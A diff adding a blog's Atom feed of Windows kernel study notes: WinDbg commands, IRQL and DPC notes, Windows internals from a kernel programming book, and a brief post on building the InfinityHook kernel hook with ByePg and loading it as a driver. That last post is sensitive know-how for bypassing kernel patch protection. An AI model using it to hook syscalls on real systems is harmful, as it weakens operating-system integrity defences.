+  &lt;li&gt;https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/d–da–db–dc–dd–dd–df–dp–dq–du–dw–dw–dyb–dyd–display-memor&lt;/li&gt;
+  &lt;li&gt;https://leanpub.com/windowskernelprogramming&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;commands&quot;&gt;Commands&lt;/h2&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Command&lt;/th&gt;
+      &lt;th&gt;Action&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;~&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;Show threads for process&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;k&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;Show stack trace of current thread&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;~ns&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;Switch thread, eg. &lt;code class=&quot;highlighter-rouge&quot;&gt;~0s&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;~nk&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;Get call stack of thread without switching, e.g. &lt;code class=&quot;highlighter-rouge&quot;&gt;~1k&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;? &amp;lt;Hex&amp;gt;&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;Convert hex number to decimal&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;? &amp;lt;0nDec&amp;gt;&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;Covnert dec number to hex&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;!teb &amp;lt;addr&amp;gt;&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;Examine TEB of a thread. Addr gets current thread&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;!peb&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;View the PEB&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dt &amp;lt;structure&amp;gt;&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;Dump the structure info, e.g. &lt;code class=&quot;highlighter-rouge&quot;&gt;dt ntdll!_teb&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;bp &amp;lt;function/loc&amp;gt;&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;Set breakpoint at location&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;bl&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;List breakpoints&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;r &amp;lt;register&amp;gt;&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;Display register contents, e.g. &lt;code class=&quot;highlighter-rouge&quot;&gt;r&lt;/code&gt; displays all registers&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;db &amp;lt;addr&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;display bytes of memory&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;u&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;List the next 8 instructions to be executed&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;p&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;Step over&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;t&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;Step into&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;!Process 0 0&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;Display basic information for all processes on system&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;!Process 0 0 &amp;lt;exe&amp;gt;&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;List all process running an executable&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;!process &amp;lt;address&amp;gt; !&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;Get detailed info about a process&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+break&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;Stop long running WinDbg command&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sxe ld somethin.dll&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;Break on module load&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;reading-output&quot;&gt;Reading Output&lt;/h2&gt;
+&lt;h3 id=&quot;threads&quot;&gt;Threads&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Output Item&lt;/th&gt;
+      &lt;th&gt;Meaning&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;.&lt;/code&gt; before thread data&lt;/td&gt;
+      &lt;td&gt;Current thread&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;#&lt;/code&gt; before thread data&lt;/td&gt;
+      &lt;td&gt;Indicates that this thread caused the last breakpoing&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;_structurename&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;Structures are prefixed with &lt;code class=&quot;highlighter-rouge&quot;&gt;_&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;</content><author><name>Josh Finley</name></author><summary type="html">References</summary></entry><entry><title type="html">Notes on IRQL and Deferred Procedure Calls</title><link href="http://localhost:4000/irql-dpc/" rel="alternate" type="text/html" title="Notes on IRQL and Deferred Procedure Calls" /><published>2020-03-16T00:05:28-05:00</published><updated>2020-03-16T00:05:28-05:00</updated><id>http://localhost:4000/irql-dpc</id><content type="html" xml:base="http://localhost:4000/irql-dpc/">&lt;h2 id=&quot;interrupt-request-level&quot;&gt;Interrupt Request Level&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;every hardware interrupt is associated with a priority: &lt;em&gt;Interrupt Request Level (IRQL)&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;The HAL determines a hardware interrupts IRQL&lt;/li&gt;
+  &lt;li&gt;Code with highest IRQL gets executed first&lt;/li&gt;
+  &lt;li&gt;Process:
+    &lt;ul&gt;
+      &lt;li&gt;IRQL triggers CPU to save its context in the current threads kernel stack and raise its IRQL to that of the request, and then executes the corresponding Interrupt Service Routine&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Important IRQLs:
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PASSIVE LEVEL&lt;/code&gt;: normal IRQL. Thread scheduling normal&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;APC_LEVEL&lt;/code&gt;: for specific kernel APCs. Thread scheduling normal&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;DISPATCH_LEVEL&lt;/code&gt;: this CPU cannot be woken by thread scheduler, no access to page memory allowed, cannot wait on kernel objects&lt;/li&gt;
+      &lt;li&gt;Device IRQL: Like &lt;code class=&quot;highlighter-rouge&quot;&gt;DISPATCH_LEVEL&lt;/code&gt; but with range of levels (3-11 on x64).&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;HIGH_LEVEL&lt;/code&gt;: Highest level, masks all other interrupts. value is 15 on x64&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;If IRQL 2 or higher:
+    &lt;ul&gt;
+      &lt;li&gt;Must access non-paged pool. Access to paged or user-supplied buffers is unsafe&lt;/li&gt;
+      &lt;li&gt;Crash occurs if a dispatcher kernel object is awaited (unless timeout is 0)&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Thread scheduler runs at IRQL 2. Anything higher than that has no ability to switch contexts&lt;/li&gt;
+  &lt;li&gt;IRQL can only be changed in kernel mode. Use &lt;code class=&quot;highlighter-rouge&quot;&gt;KeRaiseIrql&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;KeLowerIrql&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Always verify that the IRQL has been raised after attempting to raise it&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;deferred-procedure-calls&quot;&gt;Deferred Procedure Calls&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Cause a PC to wait while it is servicing a request for data from a peripheral device.&lt;/li&gt;
+  &lt;li&gt;Steps:
+    &lt;ul&gt;
+      &lt;li&gt;Data from hardware device is requested by the OS&lt;/li&gt;
+      &lt;li&gt;Interrupt Service Routine (ISR) issued&lt;/li&gt;
+      &lt;li&gt;If device cannot immediately service the request, DPC is issued&lt;/li&gt;
+      &lt;li&gt;Everything else wiats while the request for data is fulfilled.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;DPCs are associated with a system-defined DPC object&lt;/li&gt;
+  &lt;li&gt;One DPC object is supplied for each device object&lt;/li&gt;
+  &lt;li&gt;Drivers can have more than one DPC object&lt;/li&gt;
+  &lt;li&gt;DPC structure is undocumented. &lt;a href=&quot;https://github.com/joshfinley/ntoskrnl/blob/master/Include/ntosdef.h&quot;&gt;see the definition for KDPC&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;https://leanpub.com/windowskernelprogramming&lt;/li&gt;
+  &lt;li&gt;https://helpdesk.flexradio.com/hc/en-us/articles/202118398-What-are-DPCs-and-why-do-they-matter-&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Josh Finley</name></author><summary type="html">Interrupt Request Level</summary></entry><entry><title type="html">Memorizing Basic Windows Details</title><link href="http://localhost:4000/windows-basics/" rel="alternate" type="text/html" title="Memorizing Basic Windows Details" /><published>2020-03-13T00:05:28-05:00</published><updated>2020-03-13T00:05:28-05:00</updated><id>http://localhost:4000/windows-basics</id><content type="html" xml:base="http://localhost:4000/windows-basics/">&lt;p&gt;As I’ve been working my Pavel Yosifovich’s &lt;em&gt;Kernel Programming for Windows&lt;/em&gt;, I’ve found that theres a few basic details of the Windows operating system that I have yet to commit to muscle-memory. This page is just some simple notes from the book to maybe help with retention. Items marked with a (?) are those that I feel the need to learn more about.&lt;/p&gt;
+
+&lt;h2 id=&quot;virtual-memory&quot;&gt;Virtual Memory&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;default 32 bit address space for processes is 2 GB&lt;/li&gt;
+  &lt;li&gt;specifying the &lt;code class=&quot;highlighter-rouge&quot;&gt;LARGEADDRESSAWARE&lt;/code&gt; flag in the PE header allows the address space size to be increased to a max of 3 GB. Binary must have been linked with LARGEADDRESSAWARE linker flag. This brings me back to the days of modding &lt;em&gt;Fallout: New Vegas&lt;/em&gt; which was wonderful but limited severely by 32 bit memory requirements. There was a popular mod which I think did exactly this and was able to extend the AS to 4 GB.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;page-states&quot;&gt;Page States&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Free&lt;/li&gt;
+  &lt;li&gt;Committed&lt;/li&gt;
+  &lt;li&gt;Reserved&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;system-memory&quot;&gt;System Memory&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Operating system resides in upper address range
+    &lt;ul&gt;
+      &lt;li&gt;32 bit: 0x80000000-0xFFFFFFF&lt;/li&gt;
+      &lt;li&gt;32 bit w/ increase v_address_space setting: 0xC0000000-0XFFFFFFFF&lt;/li&gt;
+      &lt;li&gt;64 bit Win8/2012: upper 8TB&lt;/li&gt;
+      &lt;li&gt;64 bit Win8.1/2012 R2 and later: upper 128 TB&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;threads&quot;&gt;Threads&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Processes expose resources like virtual memory and kernel object handles to threads&lt;/li&gt;
+  &lt;li&gt;threads own:
+    &lt;ul&gt;
+      &lt;li&gt;current access mode&lt;/li&gt;
+      &lt;li&gt;execution context&lt;/li&gt;
+      &lt;li&gt;one or two stacks (?)(why two? answered below)&lt;/li&gt;
+      &lt;li&gt;Thread Local Storage array (?)&lt;/li&gt;
+      &lt;li&gt;Base priority / dynamic priority&lt;/li&gt;
+      &lt;li&gt;Processor affinity (?)&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;thread stacks:
+    &lt;ul&gt;
+      &lt;li&gt;32 bit: default 12 KB&lt;/li&gt;
+      &lt;li&gt;64 bit: default 24 KB&lt;/li&gt;
+      &lt;li&gt;user mode threads have two stacks.
+        &lt;ul&gt;
+          &lt;li&gt;the first is the kernel stack and cant be paged out&lt;/li&gt;
+          &lt;li&gt;the second one resides in the user address space range and has a default max of 1 MB.
+            &lt;ul&gt;
+              &lt;li&gt;can be paged out&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;user mode thread stack:
+    &lt;ul&gt;
+      &lt;li&gt;starts with a small amount of memory committed, the remaining being reserved&lt;/li&gt;
+      &lt;li&gt;the next page after the initially commited memory is marked with a special protection &lt;code class=&quot;highlighter-rouge&quot;&gt;PAGE_GAURD&lt;/code&gt; and is called the Gaurd Page (?)(marked where?)&lt;/li&gt;
+      &lt;li&gt;once the gaurd page is written to, an exception is thrown to be handled by the memory manager, who removes the gaurd and commits the memory&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;system-services--system-calls&quot;&gt;System Services \ System Calls&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt; is also known as the &lt;code class=&quot;highlighter-rouge&quot;&gt;Native API&lt;/code&gt;. Didn’t know that.&lt;/li&gt;
+  &lt;li&gt;transition to kernel mode: 64 bit = syscall, 32 bit = sysenter&lt;/li&gt;
+  &lt;li&gt;following the transition, the dispatcher routine indexes into the SSDT to jump to the actual system call&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;architecture&quot;&gt;Architecture&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;executive hold the various managers: Object Manager, Memory Manager, I/O Manager, PnP Manager, Power Manager, Configuration Manager.&lt;/li&gt;
+  &lt;li&gt;executive is the larger upper layer of ntoskrnl.exe, and the kernel itself is the lower layer.&lt;/li&gt;
+  &lt;li&gt;kernel layer implements thread scheduling, interrupt, and exception dispatching&lt;/li&gt;
+  &lt;li&gt;kernel layer implements kernel primitives (?)(what are some other ‘primitives’)&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;win32k.sys&lt;/code&gt; is responsible for much of the graphics capabilities of the operating system (?)(was it always in the kernel?)&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;HAL&lt;/code&gt; provides abstractions to make dealing with physical devices easier&lt;/li&gt;
+  &lt;li&gt;System Processes include &lt;code class=&quot;highlighter-rouge&quot;&gt;smss.exe, lsass.exe, winlogon.exe, services.exe&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;csrss.exe&lt;/code&gt; is a helper to the kernel for managing processes. One instance runs per session. Manager the windows subsystem&lt;/li&gt;
+  &lt;li&gt;VBS (virtualization based security) puts the actual machine in a Hyper-V virtual machine. Whoa.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;handles-and-objects&quot;&gt;Handles and Objects&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Objects, managed by the Object Manager, count their references and will not be allowed to be destroyed until all references are released&lt;/li&gt;
+  &lt;li&gt;Instances of these are data structures&lt;/li&gt;
+  &lt;li&gt;Objects reside in system space&lt;/li&gt;
+  &lt;li&gt;User mode must access these indirectly through &lt;code class=&quot;highlighter-rouge&quot;&gt;handles&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Handles are indexes into tables maintained by processes.&lt;/li&gt;
+  &lt;li&gt;the indexes point logically to the kernel object in system space&lt;/li&gt;
+  &lt;li&gt;drivers turn handles into pointers using &lt;code class=&quot;highlighter-rouge&quot;&gt;ObReferenceObjectByHandle&lt;/code&gt; function&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; is never a valid handle&lt;/li&gt;
+  &lt;li&gt;handles are in increments of &lt;code class=&quot;highlighter-rouge&quot;&gt;4&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;resource leaks are prevented by calling &lt;code class=&quot;highlighter-rouge&quot;&gt;ObDereferenceObject&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;the WinObj sysinternals program interfaces with the Object Manager&lt;/li&gt;
+  &lt;li&gt;each object points to an object type&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Create&lt;/code&gt; functions called with a name will either actually create the object or open an existing one if the name exists. This can be checked for by using &lt;code class=&quot;highlighter-rouge&quot;&gt;GetLastError&lt;/code&gt;and seeing if it returns &lt;code class=&quot;highlighter-rouge&quot;&gt;ERROR_ALREADY_EXISTS&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;names for objects are prepended with various strings&lt;/li&gt;
+  &lt;li&gt;object names are session-relative. to share across sessions, it can be created in session 0 by prepending the object name with &lt;code class=&quot;highlighter-rouge&quot;&gt;Global\&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;every process has a private handle table to kernel objects&lt;/li&gt;
+  &lt;li&gt;access masks define what operations are allowed to be performed on a handle. Access handles with the proper access mask&lt;/li&gt;
+  &lt;li&gt;to get the true number of references to an object, use kd’s &lt;code class=&quot;highlighter-rouge&quot;&gt;trueref&lt;/code&gt; command. E.g. &lt;code class=&quot;highlighter-rouge&quot;&gt;trueref &amp;lt;objaddr&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;additional-reading&quot;&gt;Additional Reading&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;https://en.wikipedia.org/wiki/Object_Manager_(Windows)&lt;/li&gt;
+  &lt;li&gt;https://docs.microsoft.com/en-us/windows/win32/secauthz/access-rights-and-access-masks&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Josh Finley</name></author><summary type="html">As I’ve been working my Pavel Yosifovich’s Kernel Programming for Windows, I’ve found that theres a few basic details of the Windows operating system that I have yet to commit to muscle-memory. This page is just some simple notes from the book to maybe help with retention. Items marked with a (?) are those that I feel the need to learn more about.</summary></entry><entry><title type="html">Fixing InfinityHook with ByePg</title><link href="http://localhost:4000/infinityhook-byepg/" rel="alternate" type="text/html" title="Fixing InfinityHook with ByePg" /><published>2020-01-22T00:00:00-06:00</published><updated>2020-01-22T00:00:00-06:00</updated><id>http://localhost:4000/infinityhook-byepg</id><content type="html" xml:base="http://localhost:4000/infinityhook-byepg/">&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/everdox/infinityhook
+git clone https://github.com/can1357/ByePg.git
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Open both in Visual Studio, build ByePg and the InfinityHookFix projects, and add the output and source directories from ByePg and the InfinityHook fix respectively to  &lt;code class=&quot;highlighter-rouge&quot;&gt;Additional Include Directories&lt;/code&gt; under &lt;code class=&quot;highlighter-rouge&quot;&gt;libinfityhook-&amp;gt;properies-&amp;gt;C/C++-&amp;gt;General&lt;/code&gt; and add the &lt;code class=&quot;highlighter-rouge&quot;&gt;Output\InfinityHookFix.lib&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Output\ByePgLib.lib&lt;/code&gt; to the linker dependencies for &lt;code class=&quot;highlighter-rouge&quot;&gt;kinfinityhook&lt;/code&gt;.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Add &lt;code class=&quot;highlighter-rouge&quot;&gt;#include &quot;IhFix.h&quot;&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;libinfinityhook\infinityhook.cpp&lt;/code&gt;: &lt;img src=&quot;/assets/IhFix-include.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Call the &lt;code class=&quot;highlighter-rouge&quot;&gt;FixInfinityHook&lt;/code&gt; function:&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/IhFix-IfhInitialize.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Build the solution and copy it to the target. Register and start the service: &lt;img src=&quot;/assets/osr-loader.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/infinityhook-loaded.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>Josh Finley</name></author><summary type="html">git clone https://github.com/everdox/infinityhook git clone https://github.com/can1357/ByePg.git</summary></entry></feed>
